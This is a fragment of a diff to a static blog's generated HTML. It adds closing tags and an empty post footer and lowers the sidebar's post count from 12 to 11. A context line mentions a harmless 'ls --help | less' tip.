+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
@@ -3297,7 +3236,7 @@ ls --help | less     //查看ls的帮助信息,并分页显示(less更智能,可
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
